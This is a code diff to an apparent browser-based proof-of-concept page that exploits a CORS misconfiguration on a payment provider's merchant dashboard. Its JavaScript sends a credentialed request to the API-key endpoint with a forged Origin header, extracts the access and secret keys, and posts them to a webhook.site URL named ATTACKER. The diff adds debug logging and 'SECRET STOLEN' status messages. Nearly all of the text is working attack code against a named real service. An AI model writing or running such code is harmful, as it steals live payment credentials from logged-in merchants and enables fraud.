@@ -11,12 +11,12 @@
 
   <script>
     const TARGET = "https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys";
-    const ATTACKER = "https://webhook.site/257b5906-77de-4391-a468-beaa821222c7"; // REPLACE WITH YOUR NEW WEBHOOK URL
+    const ATTACKER = "https://webhook.site/257b5906-77de-4391-a468-beaa821222c7"; // REPLACE WITH NEW WEBHOOK URL
     const status = document.getElementById('status');
 
     async function steal() {
       try {
-        status.innerHTML = "Sending Origin: https://ShadowArpit.github.io";
+        status.innerHTML = "1. Sending request to Rapyd...";
 
         const response = await fetch(TARGET, {
           method: 'GET',
@@ -24,9 +24,16 @@
           headers: {
             'Accept': 'application/json',
             'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://ShadowArpit.github.io'
+            'Origin': 'https://shadowarpit.github.io' // LOWERCASE
           }
         });
+
+        status.innerHTML = "2. Checking response...";
+
+        // Log CORS headers for debugging
+        const corsOrigin = response.headers.get('access-control-allow-origin');
+        const corsCredentials = response.headers.get('access-control-allow-credentials');
+        console.log("CORS Headers:", { corsOrigin, corsCredentials });
 
         if (!response.ok) {
           const text = await response.text();
@@ -39,11 +46,12 @@
 
         if (!secret || !access) throw new Error("Secret key not found in response");
 
-        status.innerHTML = "SECRET STOLEN! Check webhook.site";
+        status.innerHTML = "3. SECRET STOLEN! Sending to webhook...";
 
         await fetch(ATTACKER, {
           method: 'POST',
           mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             access_key: access,
             secret_key: secret,
@@ -52,6 +60,7 @@
           })
         });
 
+        status.innerHTML = "SUCCESS! Check webhook.site";
         console.log("STOLEN:", { access, secret });
       } catch (e) {
         status.innerHTML = "ERROR: " + e.message;
